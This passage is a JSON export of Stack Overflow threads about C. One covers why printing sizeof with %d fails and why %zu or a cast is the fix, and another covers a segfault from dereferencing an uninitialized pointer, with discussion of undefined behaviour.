"creation_date": 1500075221, "post_id": 44927489, "comment_id": 77197380, "body": "@parasghai: you can accept one of the answers by clicking on the grey checkmark below its score."}], "answers": [{"comments": [{"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 2, "creation_date": 1499261502, "post_id": 44927538, "comment_id": 76830915, "body": "If the OP is using MS Visual Studio and for completeness: MS Visual Studio didn&#39;t support <code>%zu</code> printf specifier before VS2013. Starting from VS2013 (e.g. <code>_MSC_VER &gt;= 1800</code>) <code>%zu</code> is finally available. So casting like the other answer would be an option if <code>%zu</code> isn&#39;t available."}], "tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 9, "last_activity_date": 1499261038, "creation_date": 1499261038, "answer_id": 44927538, "question_id": 44927489, "link": "https://stackoverflow.com/questions/44927489/use-of-sizeof-operator-in-c/44927538#44927538", "title": "Use of sizeof operator in C", "body": "<p>Both of those are wrong you must use <code>%zu</code> to print values of type <code>size_t</code>, which is what <code>sizeof</code> return.</p>\n\n<p>This is because different values have different size, and you must match them.</p>\n\n<p>It's undefined behavior to mismatch like you do, so anything could happen.</p>\n"}, {"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499281634, "post_id": 44927539, "comment_id": 76844169, "body": "<code>\\n</code> is a good idea, yet output like <code>&quot;4481\\n&quot;</code> would benefit with additional spacing.  Detail: it is because the types do not match."}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1499325462, "post_id": 44927539, "comment_id": 76860020, "body": "sorry, <i><code>stdout</code> is line buffered</i> is not exact.  Stdio actually checks if the descriptor is associated with a tty device by making a <code>ioctl(2)</code> system call (normally as a result of a <code>isatty(3)</code> call, and if that is true, it switches to line buffering.  Else, full buffering is done. There&#39;s an alternative, calling <code>fflush(3)</code> on <code>stdout</code>, after the last <code>printf(3)</code> call."}], "tags": [], "owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "is_accepted": false, "score": 3, "last_activity_date": 1499261863, "last_edit_date": 1499261863, "creation_date": 1499261038, "answer_id": 44927539, "question_id": 44927489, "link": "https://stackoverflow.com/questions/44927489/use-of-sizeof-operator-in-c/44927539#44927539", "title": "Use of sizeof operator in C", "body": "<p>This is because sizes mismatch. By either using <code>%zu</code> or using <code>%u</code> and casting to <code>unsigned</code> you may fix the problem.</p>\n\n<p>Currently, your implementation is undefined behaviour.</p>\n\n<pre><code> printf(\"%u\", (unsigned)sizeof(int));//size of integer\n printf(\"%u\", (unsigned)sizeof(float));\n printf(\"%u\", (unsigned)sizeof(double));\n printf(\"%u\", (unsigned)sizeof(char));\n</code></pre>\n\n<p>Since <code>stdout</code> is new line buffered, don't forget to print <code>\\n</code> at the end to get anything to screen.</p>\n"}, {"comments": [{"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1499263339, "post_id": 44927923, "comment_id": 76832304, "body": "OP&#39;s <code>size_t</code> is probably <code>unsigned long</code>, but not a <code>long</code>, since <code>size_t</code> must be an <code>unsigned</code> integer type."}, {"owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1499264479, "post_id": 44927923, "comment_id": 76833256, "body": "@DavidBowling, I think so, by the type size matters, as I do not think the sign will influence the behaviour of printf for such a small value."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499282019, "post_id": 44927923, "comment_id": 76844393, "body": "Since the small values are representable as a signed and unsigned integer, C11 &#167;6.5.2.2 6 applies.  <code>scanf()</code> does not &quot;know&quot; if it received a signed or unsigned."}], "tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": false, "score": 2, "last_activity_date": 1499262523, "last_edit_date": 1499262523, "creation_date": 1499261996, "answer_id": 44927923, "question_id": 44927489, "link": "https://stackoverflow.com/questions/44927489/use-of-sizeof-operator-in-c/44927923#44927923", "title": "Use of sizeof operator in C", "body": "<p><code>sizeof</code> has the return type <code>size_t</code>.  From the Standard,</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>6.5.3.4  The sizeof and _Alignof operators\n</code></pre>\n\n<blockquote>\n  <p>5 The  value  of  the  result  of  both  operators  is \n  implementation-de\ufb01ned,  and  its  type  (an unsigned integer type) is\n  size_t, de\ufb01ned in <code>&lt;stddef.h&gt;</code> (and other headers).</p>\n</blockquote>\n\n<p><code>size_t</code> is implementation-defined.  In my linux, size_t is defined as <code>__SIZE_TYPE__</code>. On this topic, one can find details <a href=\"https://stackoverflow.com/questions/36857141/gcc-compiler-size-type\">here</a>.</p>\n\n<p>In your case, it happens that size_t is implemented as a long , longer than <code>int</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": false, "score": 0, "last_activity_date": 1499263609, "creation_date": 1499263609, "answer_id": 44928523, "question_id": 44927489, "link": "https://stackoverflow.com/questions/44927489/use-of-sizeof-operator-in-c/44928523#44928523", "title": "Use of sizeof operator in C", "body": "<blockquote>\n  <p>I did not understand why I have to take long int to print a small range number.</p>\n</blockquote>\n\n<p>Because <code>size_t</code> may represent values much larger than what an <code>int</code> can support; on my particular implementation, the max size value is <code>18446744073709551615</code>, which <em>definitely</em> won't fit in an <code>int</code>.  </p>\n\n<p>Remember that the operand of <code>sizeof</code> may be a parenthesized type name <em>or</em> an object expression:</p>\n\n<pre><code>static long double really_big_array[100000000];\n...\nprintf( \"sizeof really_big_array = %zu\\n\", sizeof really_big_array );\n</code></pre>\n\n<p><code>size_t</code> must be able to represent the size of the largest object the implementation allows.  </p>\n"}, {"comments": [{"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1499420769, "post_id": 44928742, "comment_id": 76910153, "body": "hahahaha... well... then I concede also and shall take off  my comment of he way :)"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 0, "last_activity_date": 1499332586, "last_edit_date": 1499332586, "creation_date": 1499264159, "answer_id": 44928742, "question_id": 44927489, "link": "https://stackoverflow.com/questions/44927489/use-of-sizeof-operator-in-c/44928742#44928742", "title": "Use of sizeof operator in C", "body": "<p>You say <em>it does not work</em>, but you do not say what it does. The most probable reason for this unexpected behavior is:</p>\n\n<ul>\n<li>the conversion specifier <code>%d</code> expects an <code>int</code> value. <code>sizeof(int)</code> has type <code>size_t</code> which is unsigned and, on many platforms, larger than <code>int</code>, causing undefined behavior.</li>\n</ul>\n\n<p>The conversion specifier and the type of the passed argument must be consistent because different types are passed in different ways to a vararg function like <code>printf()</code>.  If you pass a <code>size_t</code> and <code>printf</code> expects an <code>int</code>, it will retrieve the value from the wrong place and produce inconsistent output if at all.</p>\n\n<p>You say <em>it works if I put <code>%ld</code></em>.  This conversion may work because <code>size_t</code> happens to have the same size as <code>long</code> for your platform, but it is only a coincidence, on 64-bit Windows, <code>size_t</code> is larger than <code>long</code>.</p>\n\n<p>To correct the problem, you can either:</p>\n\n<ul>\n<li>use the standard conversion specifier <code>%zu</code> or</li>\n<li>cast the value as <code>int</code>.</li>\n</ul>\n\n<p>The first is the correct fix but some C libraries do not support <code>%zu</code>, most notably Microsoft C runtime libraries prior to VS2013.  Hence I recommend the second as more portable and sufficient for types and objects that obviously have a small size:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    printf(\"%d\\n\", (int)sizeof(int));\n    printf(\"%d\\n\", (int)sizeof(float));\n    printf(\"%d\\n\", (int)sizeof(double));\n    printf(\"%d\\n\", (int)sizeof(char));\n    return 0;\n}\n</code></pre>\n\n<p>Also note that you do not output a newline:  Depending on the environment, the output will not be visible to the user until a newline is output or <code>fflush(stdout)</code> is called. It is even possible that the output not be flushed to the console upon program exit, causing your observed behavior, but such environments are uncommon. It is recommended to output newlines at the end of meaningful pieces of output. In your case, not doing so would cause all sizes to be clumped together as a sequence of digits like <code>4481</code>, which may or may not be what you expect.</p>\n"}], "owner": {"reputation": 17, "user_id": 6940527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed42a2a967f2f6e0819a058dc69eb001?s=128&d=identicon&r=PG&f=1", "display_name": "paras ghai", "link": "https://stackoverflow.com/users/6940527/paras-ghai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 503, "favorite_count": 0, "answer_count": 5, "score": 0, "last_activity_date": 1499332586, "creation_date": 1499260931, "last_edit_date": 1499261766, "question_id": 44927489, "link": "https://stackoverflow.com/questions/44927489/use-of-sizeof-operator-in-c", "title": "Use of sizeof operator in C", "body": "<p>I wrote a code to print size of different data types in C .</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n     printf(\"%d\", sizeof(int));//size of integer\n     printf(\"%d\", sizeof(float));\n     printf(\"%d\", sizeof(double));\n     printf(\"%d\", sizeof(char));\n}\n</code></pre>\n\n<p>This does not work , but if I replace <code>%d</code> with <code>%ld</code>, it works. I did not understand why I have to take <code>long int</code> to print a small range number.</p>\n"}, {"tags": ["c", "segmentation-fault"], "comments": [{"owner": {"reputation": 6254, "user_id": 2261424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a0beda634f65f29aace865be9504e5e6?s=128&d=identicon&r=PG", "display_name": "AntonH", "link": "https://stackoverflow.com/users/2261424/antonh"}, "edited": false, "score": 0, "creation_date": 1499260787, "post_id": 44927431, "comment_id": 76830372, "body": "<code>x = teste();</code> shouldn&#39;t that be <code>test</code>? Typo? Also, working with memory that isn&#39;t assigned or allocated, and then wondering why it faults?"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 5, "creation_date": 1499260809, "post_id": 44927431, "comment_id": 76830382, "body": "Undefined behavior is undefined"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1499260870, "post_id": 44927431, "comment_id": 76830415, "body": "<i>Neither</i> version actually works. Where does the pointer <code>p</code> point?"}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "reply_to_user": {"reputation": 6254, "user_id": 2261424, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a0beda634f65f29aace865be9504e5e6?s=128&d=identicon&r=PG", "display_name": "AntonH", "link": "https://stackoverflow.com/users/2261424/antonh"}, "edited": false, "score": 0, "creation_date": 1499260882, "post_id": 44927431, "comment_id": 76830425, "body": "@AntonH it is a typo."}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499260985, "post_id": 44927431, "comment_id": 76830499, "body": "@Someprogrammerdude, have you tried it?"}, {"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 0, "creation_date": 1499261000, "post_id": 44927431, "comment_id": 76830512, "body": "How can you dereference a pointer that doesn&#39;t point to anything? Even more, how dare you advance the pointer and dereference it with <code>*(p+i)</code>? <b>This pointer points to nowhere</b>, to memory potentially not owned by your process. This is what causes a segfault. This can also work fine as this is undefined behavior."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 4, "creation_date": 1499261159, "post_id": 44927431, "comment_id": 76830642, "body": "I don&#39;t need to &quot;try it&quot; because uninitialized local variables have an <i>indeterminate</i> value. If such a variable is a pointer, and you dereference it, you <i>will</i> have <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\"><i>undefined behavior</i></a>. If you have UB then that makes you whole program <i>ill-formed</i> and invalid."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1499261280, "post_id": 44927431, "comment_id": 76830734, "body": "Undefined behaviour in both cases."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499261404, "post_id": 44927431, "comment_id": 76830832, "body": "As for <i>why</i> it <i>seems</i> to be working, that depends on your compiler, your target system, your host system, and possibly the time of day and the moon phase. No one can expect to reliably replicate the &quot;working&quot; behavior of UB. If that is indeed a student that gave you the code then I would give the student a failing grade immediately."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 3, "creation_date": 1499261896, "post_id": 44927431, "comment_id": 76831240, "body": "Uhmm... if you are evaluating some C code exams, shouldn&#39;t you know about <i>undefined dbehaviour</i>?"}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499262761, "post_id": 44927431, "comment_id": 76831867, "body": "Ah, the question! Have you notice that the question is about something that was not supposed to be working?"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1499264119, "post_id": 44927431, "comment_id": 76832911, "body": "@Miguel-- you seem to be confused about undefined behavior. Undefined behavior may include working as expected. Changing one seemingly unrelated line of code may cause the code to fail. The answer to the question, &quot;So, what do you think is causing this problem?&quot; is, both code samples contain undefined behavior, and are thus not well-formed, valid C programs."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 0, "creation_date": 1499270883, "post_id": 44927431, "comment_id": 76838102, "body": "You should note that a car travelling efficiently down the highway at 100kph may well be described as &#39;working correctly&#39;, even though it has a time bomb in the trunk."}], "answers": [{"comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 1, "creation_date": 1499261328, "post_id": 44927594, "comment_id": 76830774, "body": "@Miguel it &quot;works&quot; by <i>chance</i>. For example on my computer both examples segfault."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "reply_to_user": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499261332, "post_id": 44927594, "comment_id": 76830778, "body": "@Miguel you had luck and your uninitialized pointer pointed to some <i>by luck</i> valid location for your program."}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499261439, "post_id": 44927594, "comment_id": 76830865, "body": "Ok, thanks. Even so it is quite strange. It can&#39;t be only a matter of luck."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499261548, "post_id": 44927594, "comment_id": 76830949, "body": "@Miguel of course it is a matter of luck. It&#39;s <i>undefined behaviour</i>. Roughly spoken: undefined behaviour ranges from &quot;resetting your computer&quot; to &quot;apparently working fine&quot;."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1499262333, "post_id": 44927594, "comment_id": 76831564, "body": "@Miguel-- if you are evaluating exam code in C, you had better learn about undefined behavior. <a href=\"http://port70.net/~nsz/c/c11/n1570.html#J.2\" rel=\"nofollow noreferrer\">Here is a convenient summary from the C11 Draft Standard.</a>"}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1499263415, "post_id": 44927594, "comment_id": 76832364, "body": "@DavidBowling, have you notice that the question was not about that undefined behavior? And that I haven&#39;t still see an answer from you, experts (sorry, but luck is not enough...)."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499263700, "post_id": 44927594, "comment_id": 76832573, "body": "@Miguel IMHO my answer perfectly answers your question. Please explain what is not clear in my answer and I&#39;d be happy to improve it."}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499264179, "post_id": 44927594, "comment_id": 76832976, "body": "Because it does not explains why the second example is working when it shouldn&#39;t."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1499264437, "post_id": 44927594, "comment_id": 76833223, "body": "@Miguelbut it <b>does</b> explain it. The uninitialized values are <b>not</b> the same in both cases, and with the program compiled with <i>your</i> particular compiler on <i>your</i> particular computer it happens that the value of <code>p</code> in <code>main</code> is by chance a memory address that your process is allowed to read. This memory address is probably a leftover from the initialisation code (that is the code that calls <code>main</code>). Add following line before <code>printf(&quot;%d\\n&quot;,*(p+i)); </code>: <code>printf(&quot;Address: %p\\n&quot;,(void*)(p+i));</code>, which will printout the actual address."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499264828, "post_id": 44927594, "comment_id": 76833544, "body": "@Miguel Invoking undefined behavior does not guarantee a crash.   It might crash, it might output unexpected results, or it might appear to work properly.  Subsequently making a seemingly unrelated change, such as adding a <code>printf</code> for debugging, adding an unused local variable, or (in your case) moving code into a function can change how undefined behavior manifests itself.  Another example: on my machine the second piece of code appears to work fine if I compile without optimizations but crashes if I compile with optimizations."}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499265134, "post_id": 44927594, "comment_id": 76833770, "body": "@MichaelWalz and remaining fellow experts. Thank you all for such welcome reception. It is very nice to rely with such a friendly community! With such down votes I can only conclude that my question is not worth you wiseness, and therefore I shall delete it, so that no other human may read such nonsenses. Thank you all!"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499265225, "post_id": 44927594, "comment_id": 76833849, "body": "@Miguel The fact that everybody puts comments and trys to explain, shows that the question <i>is</i> welcome, even if it has been downvoted (not by me btw)."}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499265300, "post_id": 44927594, "comment_id": 76833906, "body": "Yes, but only these last comments. These are genuine answers!"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 1, "creation_date": 1499265390, "post_id": 44927594, "comment_id": 76833985, "body": "@Miguel and nobody insulted anybody here btw. People simply insisted on the concept of <i>undefined behaviour</i>."}, {"owner": {"reputation": 1764, "user_id": 710734, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c9fbebdc7bcaa51ff86b91a45196e156?s=128&d=identicon&r=PG", "display_name": "Miguel", "link": "https://stackoverflow.com/users/710734/miguel"}, "edited": false, "score": 0, "creation_date": 1499265626, "post_id": 44927594, "comment_id": 76834168, "body": "Well, more or less. Anyways, thanks. I won&#39;t delete it."}, {"owner": {"reputation": 336, "user_id": 7761980, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/1d0b835989e13bd56acf5c18117d4c47?s=128&d=identicon&r=PG", "display_name": "ThingyWotsit", "link": "https://stackoverflow.com/users/7761980/thingywotsit"}, "edited": false, "score": 1, "creation_date": 1499270563, "post_id": 44927594, "comment_id": 76837906, "body": "To be pedantic, if the app produces the expected output, it&#39;s BAD luck - you might deliver the app to 10,000 customers before you find out its behaviour is undefined."}], "tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": false, "score": 7, "last_activity_date": 1499263801, "last_edit_date": 1499263801, "creation_date": 1499261154, "answer_id": 44927594, "question_id": 44927431, "link": 